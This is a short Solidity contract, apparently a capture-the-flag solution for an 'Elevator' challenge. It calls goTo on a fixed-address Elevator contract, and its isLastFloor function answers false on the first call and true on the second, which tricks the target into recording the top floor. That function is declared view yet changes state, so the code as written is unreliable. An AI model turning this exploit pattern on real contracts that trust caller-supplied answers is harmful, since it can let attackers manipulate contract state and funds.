contract hackBuilding {
    Elevator public instance = Elevator(0x69b9b7c3f7a5cc1d71005390ef4cfb882a0d1ff5); 
    bool public levelpressed =  false; 
    
    function hack() public {
        instance.goTo(1);
    }
    
    function isLastFloor(uint) view public returns (bool) {
        // first call
      if (! levelpressed) {
        levelpressed = true;
        return false;
        // second call
      } else {
        levelpressed = false;
        return true;
      }
    }
}